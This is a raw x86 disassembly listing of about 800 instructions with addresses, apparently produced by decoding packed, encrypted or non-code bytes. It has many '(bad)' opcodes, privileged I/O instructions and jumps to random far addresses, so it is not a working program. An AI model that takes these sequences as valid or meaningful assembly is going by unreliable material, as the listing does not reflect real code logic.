  41ccd4:	xor    DWORD PTR [esi-0x3a],ecx
  41ccd7:	(bad)  
  41ccd9:	iret   
  41ccda:	int    0x7b
  41ccdc:	in     eax,dx
  41ccdd:	(bad)  
  41ccde:	sar    DWORD PTR [ebx+0x5c3f85b1],cl
  41cce4:	call   0x11db:0x947746ad
  41cceb:	xor    esp,0x1f0ff798
  41ccf1:	dec    eax
  41ccf2:	xchg   edx,eax
  41ccf3:	repnz idiv BYTE PTR [ebp+0x4f]
  41ccf7:	loope  0x41cd0e
  41ccf9:	hlt    
  41ccfa:	adc    al,0xcb
  41ccfc:	icebp  
  41ccfd:	int3   
  41ccfe:	and    edx,DWORD PTR [edx+ebx*4+0x72]
  41cd02:	js     0x41cd3d
  41cd04:	std    
  41cd05:	push   0x8f34d7ec
  41cd0a:	cmp    BYTE PTR [ebp-0x5e22e792],al
  41cd10:	int3   
  41cd11:	repnz repnz sbb DWORD PTR [edx+0x6],ebx
  41cd16:	retf   0x7e6
  41cd19:	cmp    ah,BYTE PTR [edi-0x37b166ad]
  41cd1f:	jb     0x41ccc1
  41cd21:	aam    0x1c
  41cd23:	adc    ebx,DWORD PTR [esi]
  41cd25:	loope  0x41ccb2
  41cd27:	stos   DWORD PTR es:[edi],eax
  41cd28:	stc    
  41cd29:	jo     0x41cd76
  41cd2b:	retf   0x439d
  41cd2e:	and    BYTE PTR [esi],dl
  41cd30:	leave  
  41cd31:	ror    ebx,cl
  41cd33:	push   ecx
  41cd34:	sbb    eax,0x8948add6
  41cd39:	dec    esp
  41cd3a:	adc    ch,BYTE PTR [ebp+0x22e53fc9]
  41cd40:	jp     0x41cd95
  41cd42:	push   es
  41cd43:	mov    ss,WORD PTR [ebp+0x4576f79c]
  41cd49:	add    edi,edi
  41cd4b:	mov    esp,ecx
  41cd4d:	xor    ebp,DWORD PTR [ecx]
  41cd4f:	mov    BYTE PTR [ebx],0x29
  41cd52:	in     al,0x2b
  41cd54:	jl     0x41cd8a
  41cd56:	adc    DWORD PTR [ebp+0x41e93287],esp
  41cd5c:	push   0x4
  41cd5e:	loopne 0x41cdab
  41cd60:	mov    edx,0x2f60ad5
  41cd65:	test   edx,esi
  41cd67:	stos   DWORD PTR es:[edi],eax
  41cd68:	mov    ch,ch
  41cd6a:	das    
  41cd6b:	push   0xe2ead5a4
  41cd70:	mov    edx,0x731390cf
  41cd75:	pop    ecx
  41cd76:	js     0x41cdc8
  41cd78:	imul   esp,DWORD PTR [ecx-0x38],0x74879125
  41cd7f:	cmp    bh,ah
  41cd81:	add    ebp,DWORD PTR [ebp-0x68ec3fff]
  41cd87:	in     al,dx
  41cd88:	out    dx,eax
  41cd89:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cd8a:	lds    edi,FWORD PTR [esi]
  41cd8c:	pop    esi
  41cd8d:	clc    
  41cd8e:	add    edx,ecx
  41cd90:	loope  0x41cd49
  41cd92:	mov    edx,0x40fd4bb
  41cd97:	lahf   
  41cd98:	lods   al,BYTE PTR ds:[esi]
  41cd99:	xchg   bl,cl
  41cd9b:	sbb    BYTE PTR [edx],ah
  41cd9d:	inc    eax
  41cd9e:	sbb    al,0xf6
  41cda0:	cmp    edi,DWORD PTR [edi]
  41cda2:	adc    eax,0x76ea649a
  41cda7:	mov    DWORD PTR ds:0x918ee6c1,edx
  41cdad:	das    
  41cdae:	push   0x2
  41cdb0:	lahf   
  41cdb1:	int3   
  41cdb2:	xor    al,BYTE PTR [eax-0xf]
  41cdb5:	test   eax,0xc1a31630
  41cdba:	leave  
  41cdbb:	(bad)  
  41cdbc:	out    0xa3,eax
  41cdbe:	fistp  WORD PTR [edi+ebp*4]
  41cdc1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cdc2:	push   ebx
  41cdc3:	push   ebx
  41cdc4:	cli    
  41cdc5:	add    eax,0x95edc0e8
  41cdca:	mov    al,ds:0x6ce99e80
  41cdcf:	pop    edx
  41cdd0:	lods   al,BYTE PTR ds:[esi]
  41cdd1:	iret   
  41cdd2:	clc    
  41cdd3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cdd4:	mov    bl,0xe6
  41cdd6:	jmp    0x97623a4f
  41cddb:	push   eax
  41cddc:	sub    cl,dh
  41cdde:	inc    esi
  41cddf:	outs   dx,DWORD PTR ds:[esi]
  41cde0:	mov    esi,0xa6e379e8
  41cde5:	mov    ch,0x9
  41cde7:	shl    ah,0x19
  41cdea:	je     0x41cdda
  41cdec:	mov    ch,0xe0
  41cdee:	in     al,0x99
  41cdf0:	aas    
  41cdf1:	jmp    0x804e:0x1e877196
  41cdf8:	mov    dl,0xaf
  41cdfa:	sti    
  41cdfb:	cld    
  41cdfc:	out    0xa6,eax
  41cdfe:	inc    edi
  41cdff:	pop    esi
  41ce00:	lods   al,BYTE PTR ds:[esi]
  41ce01:	sti    
  41ce02:	outs   dx,DWORD PTR ds:[esi]
  41ce03:	ja     0x41ce01
  41ce05:	les    esp,FWORD PTR [edx+0x1a]
  41ce08:	cdq    
  41ce09:	in     eax,dx
  41ce0a:	stos   DWORD PTR es:[edi],eax
  41ce0b:	das    
  41ce0c:	add    esp,DWORD PTR [edi+0x17]
  41ce0f:	fcmovnb st,st(7)
  41ce11:	cld    
  41ce12:	mov    esp,DWORD PTR [edx]
  41ce14:	push   es
  41ce15:	mov    bh,0xd1
  41ce17:	(bad)  
  41ce18:	mov    edx,0x3198d150
  41ce1d:	pop    esi
  41ce1e:	out    dx,al
  41ce1f:	in     eax,0xf
  41ce21:	push   es
  41ce22:	shl    DWORD PTR [ebx-0x6c0a02d9],cl
  41ce28:	lods   al,BYTE PTR ds:[esi]
  41ce29:	aam    0xfe
  41ce2b:	gs mov bl,0x36
  41ce2e:	aas    
  41ce2f:	fwait
  41ce30:	add    DWORD PTR [ecx],edx
  41ce32:	dec    ebx
  41ce33:	popa   
  41ce34:	add    BYTE PTR fs:[edi],dh
  41ce37:	outs   dx,DWORD PTR ds:[esi]
  41ce38:	aaa    
  41ce39:	jae    0x41cdef
  41ce3b:	(bad)  
  41ce3c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ce3d:	jp     0x41ce56
  41ce3f:	mov    ah,0xa0
  41ce41:	sub    DWORD PTR [edx+0x5f],0x14
  41ce45:	or     dl,dh
  41ce47:	inc    ebx
  41ce48:	adc    BYTE PTR [edi+0x778a06ba],dh
  41ce4e:	dec    esp
  41ce4f:	and    bh,BYTE PTR [edx]
  41ce51:	lds    ecx,FWORD PTR [ecx+0x381cde1c]
  41ce57:	shl    BYTE PTR [eax+0x4de8bda1],1
  41ce5d:	mov    al,0xf9
  41ce5f:	gs xchg esi,eax
  41ce61:	mov    ebx,0xf5a73eab
  41ce66:	lods   al,BYTE PTR ds:[esi]
  41ce67:	sub    edx,edx
  41ce69:	(bad)  
  41ce6a:	fist   WORD PTR [eax-0x78]
  41ce6d:	arpl   WORD PTR [ebp-0x22c66515],bp
  41ce73:	mov    ds:0xc115ad82,al
  41ce78:	or     eax,0x995abb7a
  41ce7d:	das    
  41ce7e:	jmp    0x41ce9d
  41ce80:	mov    fs,WORD PTR [edi-0x70]
  41ce83:	repz js 0x41cef5
  41ce86:	leave  
  41ce87:	daa    
  41ce88:	ret    0x9bd7
  41ce8b:	mov    al,ds:0xd8122dba
  41ce90:	sbb    ah,BYTE PTR [ebx+ebx*1]
  41ce93:	mov    ch,0x37
  41ce95:	xor    al,0x26
  41ce97:	data16 mov al,0xd3
  41ce9a:	hlt    
  41ce9b:	jns    0x41cecd
  41ce9d:	sti    
  41ce9e:	sbb    eax,0x6441b88b
  41cea3:	arpl   WORD PTR [eax-0x21],dx
  41cea6:	ds popa 
  41cea8:	out    dx,al
  41cea9:	push   cs
  41ceaa:	inc    esi
  41ceab:	xor    DWORD PTR [eax-0x58],eax
  41ceae:	xor    esp,ecx
  41ceb0:	ins    BYTE PTR es:[edi],dx
  41ceb1:	push   esp
  41ceb2:	jg     0x41ce83
  41ceb4:	inc    esi
  41ceb5:	or     DWORD PTR [edx-0x4f],esp
  41ceb8:	pop    edi
  41ceb9:	lods   al,BYTE PTR ds:[esi]
  41ceba:	icebp  
  41cebb:	gs pop es
  41cebd:	sub    ebx,DWORD PTR ds:0xb770de74
  41cec3:	cld    
  41cec4:	push   esi
  41cec5:	es aam 0x73
  41cec8:	sbb    eax,ebx
  41ceca:	inc    ebp
  41cecb:	or     al,0xaa
  41cecd:	mov    ds:0xb8919089,eax
  41ced2:	aas    
  41ced3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ced4:	and    eax,0x9f944657
  41ced9:	push   ecx
  41ceda:	rol    ebp,0x95
  41cedd:	mov    ds:0x36c29372,al
  41cee2:	xchg   ebx,eax
  41cee3:	inc    eax
  41cee5:	addr16 ja 0x41ce98
  41cee8:	std    
  41cee9:	sar    BYTE PTR [esi-0x787ab5b2],1
  41ceef:	push   ebx
  41cef0:	jae    0x41cf48
  41cef2:	jmp    0x9a70:0xfd548ba6
  41cef9:	imul   ebx,DWORD PTR [ecx+eax*2],0x72
  41cefd:	pop    ebx
  41cefe:	dec    ebp
  41ceff:	adc    esi,DWORD PTR [ebp+0x53d4f4bf]
  41cf05:	and    BYTE PTR [edi-0x28ee7275],cl
  41cf0b:	ds mov bl,0x78
  41cf0e:	mov    al,0x7f
  41cf10:	repz inc edi
  41cf12:	jge    0x41cf47
  41cf14:	les    eax,FWORD PTR [edx-0x63]
  41cf17:	mov    ebx,0xbb6ddd97
  41cf1c:	aad    0x92
  41cf1e:	es pop ebp
  41cf20:	mov    al,ds:0x98ef6562
  41cf25:	sbb    dh,BYTE PTR [ebx]
  41cf27:	inc    esp
  41cf28:	sbb    DWORD PTR [ecx+0x4b9f603a],ebp
  41cf2e:	push   ebp
  41cf2f:	cmp    edx,ecx
  41cf31:	mov    al,ds:0x945b6495
  41cf36:	or     ecx,ecx
  41cf38:	sub    bl,dl
  41cf3a:	jne    0x41ceca
  41cf3c:	jl     0x41cf9a
  41cf3e:	dec    ebx
  41cf3f:	scas   al,BYTE PTR es:[edi]
  41cf40:	sti    
  41cf41:	mov    DWORD PTR ds:0x38467cbc,0xed6c605
  41cf4b:	or     eax,0x12a54310
  41cf50:	pusha  
  41cf51:	jp     0x41ceff
  41cf53:	sub    DWORD PTR [esp+edx*8-0x36],ebp
  41cf57:	xor    al,0xbc
  41cf59:	pop    esp
  41cf5a:	pop    ds
  41cf5b:	scas   eax,DWORD PTR es:[edi]
  41cf5c:	out    dx,al
  41cf5d:	jno    0x41cf23
  41cf5f:	mov    edx,0xb9a181c2
  41cf64:	push   edi
  41cf65:	cmp    al,0xa3
  41cf67:	xchg   edi,eax
  41cf68:	mov    esp,0xefaf4995
  41cf6d:	pop    eax
  41cf6e:	mov    ch,0x16
  41cf70:	rcr    BYTE PTR ss:[ebp+ebx*1+0x67346e54],cl
  41cf78:	inc    edi
  41cf79:	push   esp
  41cf7a:	jmp    0x99aec2a5
  41cf7f:	mov    ecx,0x3e9730fd
  41cf84:	inc    BYTE PTR [edi+0x4b]
  41cf87:	bound  ecx,QWORD PTR [edx+0x7fde573c]
  41cf8d:	dec    ecx
  41cf8e:	jmp    0x41cf18
  41cf90:	es aas 
  41cf92:	popf   
  41cf93:	sub    eax,0xc2b71576
  41cf98:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cf99:	je     0x41cfc8
  41cf9b:	mov    bl,0xdd
  41cf9d:	inc    esi
  41cf9e:	or     dl,ch
  41cfa0:	adc    al,BYTE PTR [esp+eax*1+0x4d]
  41cfa4:	mov    esi,0x19e4e33c
  41cfa9:	pusha  
  41cfaa:	(bad)  
  41cfab:	cmp    eax,0x77927a7c
  41cfb0:	cli    
  41cfb1:	pop    edi
  41cfb2:	out    0xc8,al
  41cfb4:	aaa    
  41cfb5:	jno    0x41d01c
  41cfb7:	xor    al,BYTE PTR [eax-0x63e90b57]
  41cfbd:	xor    eax,0x2a30f486
  41cfc2:	inc    edx
  41cfc3:	mov    cl,0xf6
  41cfc5:	in     eax,dx
  41cfc6:	pop    esp
  41cfc7:	sub    eax,0xf337b86e
  41cfcc:	jmp    0xa00b:0x1e9f
  41cfd2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cfd3:	pop    ebp
  41cfd4:	jle    0x41d02a
  41cfd6:	stc    
  41cfd7:	ss mov esp,0xb9f7b1e1
  41cfdd:	enter  0x248a,0x5e
  41cfe1:	imul   ecx,DWORD PTR es:[ecx-0x72],0x4c
  41cfe6:	mov    ebx,0x4c897799
  41cfeb:	push   cs
  41cfec:	retf   0x4579
  41cfef:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cff0:	xchg   BYTE PTR [esi],al
  41cff2:	xchg   edx,eax
  41cff3:	add    cl,BYTE PTR [edi+0x71cf7452]
  41cff9:	xor    eax,0xd0801ce4
  41cffe:	imul   DWORD PTR [edi]
  41d000:	out    0xc9,al
  41d002:	mov    BYTE PTR [esi],ch
  41d004:	add    eax,0x5ae6ddf3
  41d009:	push   esp
  41d00a:	push   0x6a019896
  41d00f:	push   edx
  41d010:	and    al,0x5
  41d012:	sbb    edx,DWORD PTR [edx-0x1d]
  41d015:	es inc ebx
  41d017:	sub    BYTE PTR [edx+edi*4+0x77ed98d],bl
  41d01e:	sub    BYTE PTR [eax-0x61081060],0xd2
  41d025:	cmp    al,0x56
  41d027:	btc    esi,eax
  41d02a:	repnz ror BYTE PTR [edi-0x76e14022],0xcd
  41d032:	mov    dh,0xfe
  41d034:	jbe    0x41d065
  41d036:	fs cld 
  41d038:	aam    0x22
  41d03a:	xchg   bh,dh
  41d03c:	add    BYTE PTR [edx+ebx*2-0x586dc70b],0xc8
  41d044:	test   al,0x1e
  41d046:	mul    DWORD PTR [edi]
  41d048:	aad    0x82
  41d04a:	xor    DWORD PTR [esi+0x76],edi
  41d04d:	mov    esi,0x2c9e9a70
  41d052:	inc    edi
  41d053:	call   0x9ef5f4d2
  41d058:	out    dx,al
  41d059:	sub    BYTE PTR [bx+si],ah
  41d05c:	xor    eax,0xd1b21674
  41d061:	add    ebp,ebx
  41d063:	cli    
  41d064:	push   cs
  41d065:	mov    edx,0xdd5f88d9
  41d06a:	add    edi,DWORD PTR [ebx]
  41d06c:	push   ecx
  41d06d:	(bad)  [edx+0x21]
  41d070:	int    0x4c
  41d072:	leave  
  41d073:	dec    ebp
  41d074:	lock jne 0x41d0d5
  41d077:	and    eax,0x9502bf82
  41d07c:	in     eax,0x46
  41d07e:	enter  0xbf9c,0xd
  41d082:	popa   
  41d083:	ss es pop eax
  41d086:	repz stc 
  41d088:	cwde   
  41d089:	leave  
  41d08a:	in     al,dx
  41d08b:	push   edi
  41d08c:	mov    bh,0x5
  41d08e:	out    dx,al
  41d08f:	es popw ds
  41d092:	jmp    0x7599:0xc439f238
  41d099:	jmp    0x41d098
  41d09b:	fadd   QWORD PTR es:[ebp+ebx*4+0x16]
  41d0a0:	jmp    0x8d47f809
  41d0a5:	stos   DWORD PTR es:[edi],eax
  41d0a6:	mov    ah,0x1e
  41d0a8:	pop    esp
  41d0a9:	pop    ds
  41d0aa:	mov    ds:0x5c8a4642,al
  41d0af:	(bad)  
  41d0b0:	jno    0x41d052
  41d0b2:	or     eax,0x9bbc7f56
  41d0b7:	or     eax,0xe0083aee
  41d0bc:	cld    
  41d0bd:	les    esi,FWORD PTR [ebx*4-0x750679d5]
  41d0c4:	in     eax,dx
  41d0c5:	push   ebp
  41d0c6:	sbb    al,0x58
  41d0c8:	imul   ebx,DWORD PTR [ecx+0x20],0x5e
  41d0cc:	inc    esi
  41d0cd:	js     0x41d0d8
  41d0cf:	and    eax,0x4b4f0f76
  41d0d4:	ins    DWORD PTR es:[edi],dx
  41d0d5:	push   esi
  41d0d6:	push   esp
  41d0d7:	push   eax
  41d0d8:	mov    edx,0x1e58653
  41d0dd:	mov    ds:0x4cc852ad,eax
  41d0e2:	pop    ebp
  41d0e3:	sar    BYTE PTR [edx],1
  41d0e5:	ret    
  41d0e6:	pop    ds
  41d0e7:	inc    eax
  41d0e8:	scas   al,BYTE PTR es:[edi]
  41d0e9:	cld    
  41d0ea:	(bad)  
  41d0eb:	pop    esp
  41d0ec:	fadd   QWORD PTR [eax+0x46]
  41d0ef:	mov    BYTE PTR [ebx+edx*8+0x58],cl
  41d0f3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d0f4:	mov    cl,0xa9
  41d0f6:	lods   eax,DWORD PTR ds:[esi]
  41d0f7:	xchg   ecx,eax
  41d0f8:	mov    gs,WORD PTR [edx-0x41d85a53]
  41d0fe:	out    0x59,al
  41d100:	lods   al,BYTE PTR ds:[esi]
  41d101:	dec    esp
  41d102:	push   ebp
  41d103:	test   dh,bl
  41d105:	push   es
  41d106:	mov    bh,0x52
  41d108:	add    BYTE PTR [ebp+0x15],0x88
  41d10c:	push   esp
  41d10d:	mov    DWORD PTR fs:[edx-0x53e98ad],edx
  41d114:	popf   
  41d115:	jae    0x41d18b
  41d117:	and    al,BYTE PTR [eax-0x51]
  41d11a:	out    0xdf,al
  41d11c:	bound  esi,QWORD PTR [esi]
  41d11e:	ja     0x41d0cd
  41d120:	(bad)  [edi-0x51e81ca6]
  41d126:	sub    cl,BYTE PTR [esi-0x71]
  41d129:	test   DWORD PTR [esi-0x39c3ced1],ebp
  41d12f:	rol    DWORD PTR [ecx+ebp*4],cl
  41d132:	not    DWORD PTR [ebp+0x3ce98260]
  41d138:	data16 lock scas al,BYTE PTR es:[edi]
  41d13b:	mov    cl,0x23
  41d13d:	dec    edx
  41d13e:	adc    al,0x6d
  41d140:	in     eax,0xbb
  41d142:	sbb    BYTE PTR [eax+0x7a],bl
  41d145:	inc    esp
  41d146:	push   es
  41d147:	loop   0x41d109
  41d149:	out    dx,al
  41d14a:	mov    ebp,0x32f182fd
  41d14f:	xchg   ebp,eax
  41d150:	(bad)  
  41d151:	int3   
  41d152:	adc    edi,DWORD PTR [ebx]
  41d154:	sbb    BYTE PTR [edi+esi*8-0x70],bl
  41d158:	and    al,0xa3
  41d15a:	sbb    esp,DWORD PTR [ecx+0x7945e4d3]
  41d160:	add    al,0xde
  41d162:	xor    dh,BYTE PTR [esi]
  41d164:	adc    dl,BYTE PTR [edi-0x5ba7454e]
  41d16a:	mov    cl,0x1
  41d16c:	jl     0x41d13c
  41d16e:	pop    edi
  41d16f:	std    
  41d170:	fs and eax,0xe1fa3d3e
  41d176:	in     al,dx
  41d177:	cmp    ebp,0xd488db6
  41d17d:	mov    ebp,0x1726c6f0
  41d182:	pusha  
  41d183:	xor    DWORD PTR [eax],esp
  41d185:	shl    DWORD PTR [esi],cl
  41d187:	xor    ecx,ebx
  41d189:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d18a:	dec    eax
  41d18b:	mov    ds:0x48ee9b42,al
  41d190:	push   0xffffffd8
  41d192:	stos   BYTE PTR es:[edi],al
  41d193:	daa    
  41d194:	stc    
  41d195:	je     0x41d1cb
  41d197:	cmp    cl,BYTE PTR [edi+0x642fea8a]
  41d19d:	xor    DWORD PTR [ebp+ebp*4-0x57],esi
  41d1a1:	das    
  41d1a2:	mov    WORD PTR [edi+0x61],cs
  41d1a5:	es sbb eax,edx
  41d1a8:	test   DWORD PTR [edi+edi*2],edi
  41d1ab:	xor    al,0xf6
  41d1ad:	loop   0x41d1d3
  41d1af:	mov    ecx,0xb8be09d5
  41d1b4:	mov    edi,0x89b685f6
  41d1b9:	loopne 0x41d216
  41d1bb:	cdq    
  41d1bc:	fldcw  WORD PTR [eax+0x1c40ceb4]
  41d1c2:	scas   al,BYTE PTR es:[edi]
  41d1c3:	mov    DWORD PTR [eax],esp
  41d1c5:	(bad)  
  41d1c6:	dec    esp
  41d1c7:	mov    edx,gs
  41d1c9:	mov    edx,0x1bf58b59
  41d1ce:	retf   0xb0f6
  41d1d1:	jno    0x41d1fb
  41d1d3:	stos   BYTE PTR es:[edi],al
  41d1d4:	push   0xffffffc3
  41d1d6:	(bad)  
  41d1d7:	mov    dh,0x8c
  41d1d9:	xor    dl,ah
  41d1db:	or     eax,0x5b1eeb3f
  41d1e0:	xchg   edx,eax
  41d1e1:	xor    eax,0x4c86a964
  41d1e6:	push   es
  41d1e7:	retf   
  41d1e8:	frstor [edi+0x51]
  41d1eb:	jle    0x41d230
  41d1ed:	ss jp  0x41d199
  41d1f0:	imul   eax,DWORD PTR [edx],0xffffffe5
  41d1f3:	ror    BYTE PTR [edx],0xda
  41d1f6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d1f7:	popf   
  41d1f8:	cmp    bl,BYTE PTR [edi]
  41d1fa:	and    al,0x9c
  41d1fc:	sub    eax,0xa8c3b330
  41d201:	mov    edi,0x3426aa41
  41d206:	(bad)  
  41d207:	fnstenv [ebx+0x13a3d79f]
  41d20d:	lahf   
  41d20e:	cmp    esi,edi
  41d210:	out    0x61,al
  41d212:	push   ecx
  41d213:	push   ss
  41d214:	dec    eax
  41d215:	arpl   WORD PTR [edx-0x6a],di
  41d218:	mov    edi,0xde41cc85
  41d21d:	fwait
  41d21e:	jmp    0xd58e:0xa884ca7c
  41d225:	mov    eax,0xc6caae2e
  41d22a:	jg     0x41d24a
  41d22c:	gs and edi,edx
  41d22f:	gs mov ebx,0x3142fcab
  41d235:	cmc    
  41d236:	pop    esp
  41d237:	std    
  41d238:	cmp    ecx,DWORD PTR [edi+0xf56ba9d]
  41d23e:	xor    ecx,DWORD PTR [esi]
  41d240:	jecxz  0x41d240
  41d242:	outs   dx,DWORD PTR ds:[esi]
  41d243:	cvtpi2ps xmm0,QWORD PTR [edx+0x7]
  41d247:	(bad)  
  41d248:	push   ds
  41d249:	mov    cl,0xdc
  41d24b:	and    edx,DWORD PTR [eax+0x15]
  41d24e:	ja     0x41d1db
  41d250:	or     edx,DWORD PTR [edi-0x1aab1659]
  41d256:	jb     0x41d257
  41d258:	mov    eax,0x165e584f
  41d25d:	test   ch,bl
  41d25f:	das    
  41d260:	xchg   ebx,eax
  41d261:	inc    edx
  41d262:	fdivr  st(3),st
  41d264:	fs xchg ebp,eax
  41d266:	inc    eax
  41d267:	scas   eax,DWORD PTR es:[edi]
  41d268:	or     BYTE PTR [ebx],ch
  41d26a:	jno    0x41d208
  41d26c:	inc    ebp
  41d26d:	hlt    
  41d26e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d26f:	push   eax
  41d270:	inc    ebp
  41d271:	add    ah,BYTE PTR [edi]
  41d273:	sar    DWORD PTR [edi+edi*4-0x6c16bf0f],1
  41d27a:	pop    ebp
  41d27b:	fwait
  41d27c:	jecxz  0x41d234
  41d27e:	adc    BYTE PTR [ecx],0x8f
  41d281:	inc    edi
  41d282:	jns    0x41d233
  41d284:	stc    
  41d285:	dec    ebx
  41d286:	fstp   TBYTE PTR [edx]
  41d288:	sbb    eax,0xab76dfa5
  41d28d:	jmp    0x3fd6d6f3
  41d292:	fisttp QWORD PTR [ebx-0x4b67ec0e]
  41d298:	dec    DWORD PTR [esi-0x80]
  41d29b:	lods   al,BYTE PTR ds:[esi]
  41d29c:	or     eax,0xe9d631c1
  41d2a1:	imul   eax,edx,0x35
  41d2a4:	mov    dl,0x7c
  41d2a6:	scas   eax,DWORD PTR es:[edi]
  41d2a7:	jge    0x41d282
  41d2a9:	xor    BYTE PTR [edi],0xa
  41d2ac:	int    0xc6
  41d2ae:	cmp    ah,bl
  41d2b0:	jmp    0xfad7841f
  41d2b5:	(bad)  
  41d2b6:	push   ds
  41d2b7:	in     al,dx
  41d2b8:	das    
  41d2b9:	jbe    0x41d2b2
  41d2bb:	stos   BYTE PTR es:[edi],al
  41d2bc:	xor    al,BYTE PTR [edi-0x3f608dc4]
  41d2c2:	cs mov es,WORD PTR cs:[edi-0x268cd686]
  41d2ca:	push   esp
  41d2cb:	int    0xa7
  41d2cd:	(bad)  
  41d2ce:	lock jmp 0x19ec:0x362ea0bd
  41d2d6:	lahf   
  41d2d7:	adc    edx,eax
  41d2d9:	xor    eax,0x78d10ecd
  41d2de:	mov    ds:0xb34581a2,al
  41d2e3:	dec    ebp
  41d2e4:	add    ecx,0xffffff8c
  41d2e7:	pusha  
  41d2e8:	xchg   edi,eax
  41d2e9:	iret   
  41d2ea:	les    edx,FWORD PTR [ebx]
  41d2ec:	jne    0x41d35d
  41d2ee:	jg     0x41d2e5
  41d2f0:	or     DWORD PTR [edi+edi*8-0x483f98cf],edi
  41d2f7:	call   0x56b8:0xf0cc321
  41d2fe:	adc    DWORD PTR ds:0xd7c41f9d,edx
  41d304:	dec    ebp
  41d305:	cmp    DWORD PTR [edi+0x4a],ecx
  41d308:	arpl   WORD PTR [edx-0x7ae8a13a],sp
  41d30e:	pop    ebp
  41d30f:	scas   eax,DWORD PTR es:[edi]
  41d310:	pop    eax
  41d311:	shl    BYTE PTR [esi+0x3c1e12c6],1
  41d317:	inc    ecx
  41d318:	enter  0x9188,0x89
  41d31c:	cs (bad) 
  41d31e:	add    eax,0xc2cf964d
  41d323:	mov    ah,0xb1
  41d325:	stos   BYTE PTR es:[edi],al
  41d326:	adc    eax,DWORD PTR [edi]
  41d328:	sbb    BYTE PTR [edx+0x2b],ah
  41d32b:	ret    0xd1ab
  41d32e:	(bad)  
  41d32f:	xor    eax,0x34897dfc
  41d334:	outs   dx,BYTE PTR ds:[esi]
  41d335:	inc    edx
  41d336:	dec    esp
  41d337:	inc    esp
  41d338:	test   DWORD PTR [edi+ebp*1-0x23],ecx
  41d33c:	lods   al,BYTE PTR ds:[esi]
  41d33d:	pop    esp
  41d33e:	loopne 0x41d30d
  41d340:	mov    ebp,0x975f6b71
  41d345:	jecxz  0x41d323
  41d347:	xor    ecx,DWORD PTR [edi]
  41d349:	jbe    0x41d326
  41d34b:	stc    
  41d34c:	push   es
  41d34d:	lock inc esi
  41d34f:	mov    esi,0x994a3f37
  41d354:	push   edi
  41d355:	ins    DWORD PTR es:[edi],dx
  41d356:	daa    
  41d357:	rcl    DWORD PTR ds:[esi-0x271d0dc],cl
  41d35e:	pop    es
  41d35f:	add    bh,al
  41d361:	cmp    DWORD PTR [ebx-0x3c],eax
  41d364:	std    
  41d365:	or     eax,0x5f3a2aba
  41d36a:	popa   
  41d36b:	cdq    
  41d36c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d36d:	and    ch,BYTE PTR [ebp-0x33fe1bdb]
  41d373:	jg     0x41d370
  41d375:	scas   eax,DWORD PTR es:[edi]
  41d376:	call   0xb51bbac0
  41d37b:	pushw  cs
  41d37d:	je     0x41d37b
  41d37f:	rep lods al,BYTE PTR ds:[esi]
  41d381:	cmc    
  41d382:	mov    dl,0xde
  41d384:	push   ds
  41d385:	les    edi,FWORD PTR [esi+0xd]
  41d388:	mov    ds:0xdf52b23,al
  41d38d:	or     eax,0x1c1b0d73
  41d392:	fcomp  QWORD PTR ds:0x887dd17f
  41d398:	add    esp,ebx
  41d39a:	cdq    
  41d39b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d39c:	and    eax,0x97d34827
  41d3a1:	adc    al,BYTE PTR [esi]
  41d3a3:	mov    DWORD PTR [esi+0x658ea848],edi
  41d3a9:	aam    0x65
  41d3ab:	pop    ss
  41d3ac:	ds mov dh,0xc0
  41d3af:	cmp    eax,0x7f90c012
  41d3b4:	jnp    0x41d398
  41d3b6:	mov    eax,ds:0xba0d73af
  41d3bb:	dec    esi
  41d3bc:	sub    ebx,edx
  41d3be:	aas    
  41d3bf:	out    dx,al
  41d3c0:	jae    0x41d386
  41d3c2:	adc    dl,BYTE PTR [ecx-0x4d08a72c]
  41d3c8:	or     cl,BYTE PTR [eax]
  41d3ca:	mov    eax,ds:0x7d0dad45
  41d3cf:	push   ss
  41d3d0:	sub    al,0xaf
  41d3d2:	add    eax,DWORD PTR [edi+0xa9bd528]
  41d3d8:	add    bh,BYTE PTR [bp-0x21]
  41d3dc:	cmp    eax,0xee8c92a0
  41d3e1:	and    eax,0x5062421d
  41d3e6:	int3   
  41d3e7:	daa    
  41d3e8:	inc    eax
  41d3e9:	sub    eax,0xf1be457e
  41d3ee:	mov    ecx,0x6d2e27e6
  41d3f3:	shr    bl,0x28
  41d3f6:	xor    eax,0x71e84f6b
  41d3fb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d3fc:	pop    ss
  41d3fd:	sub    DWORD PTR [edx-0x399fa4ee],ebx
  41d403:	das    
  41d404:	jae    0x41d40d
  41d406:	aaa    
  41d407:	dec    eax
  41d408:	push   eax
  41d409:	jne    0x41d391
  41d40b:	xchg   ebp,eax
  41d40c:	mov    edi,0xc04fb831
  41d411:	mov    edx,0x9829cfb3
  41d416:	xchg   edx,eax
  41d417:	push   ecx
  41d418:	scas   al,BYTE PTR es:[edi]
  41d419:	xchg   ecx,eax
  41d41a:	push   0x13ab312b
  41d41f:	ds arpl bx,ax
  41d422:	cmp    eax,0xa61fd165
  41d427:	add    DWORD PTR [edi-0x43],ebx
  41d42a:	loopne 0x41d3f9
  41d42c:	inc    ebx
  41d42d:	sub    cl,bh
  41d42f:	pop    ebx
  41d430:	xchg   esp,eax
  41d431:	cmc    
  41d432:	adc    ebx,DWORD PTR [esi+0x4e]
  41d435:	xchg   edi,eax
  41d436:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d437:	xlat   BYTE PTR ds:[ebx]
  41d438:	xchg   edi,eax
  41d439:	repz arpl di,di
  41d43c:	ja     0x41d49d
  41d43e:	inc    eax
  41d43f:	inc    esi
  41d440:	xor    DWORD PTR [eax-0x31cea410],ecx
  41d446:	(bad)  
  41d448:	pushf  
